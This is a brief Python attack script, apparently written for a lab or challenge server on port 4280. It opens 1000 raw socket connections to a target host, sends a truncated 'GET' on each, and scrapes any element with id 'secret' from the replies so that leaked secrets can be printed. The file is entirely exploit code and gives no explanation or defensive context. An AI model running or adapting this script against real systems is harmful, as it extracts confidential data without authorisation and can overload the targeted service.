import socket
import requests
import datetime

from bs4 import BeautifulSoup

import sys
host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

sockets = []
for i in range(1000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 4280))
	s.setblocking(0)
	s.send(b'GET')
	sockets.append(s)

found = set()
for s in sockets:
	try:
		data = s.recv(1024).decode('utf-8')
		s.close()
	except:
		continue
	if len(data) == 0:
		continue
	try:
		soup = BeautifulSoup(data, features="html.parser")
		secret = soup.find(id="secret").text
		if secret != '':
			found.add(secret)
	except:
		pass

for secret in found:
	print('Found:', secret)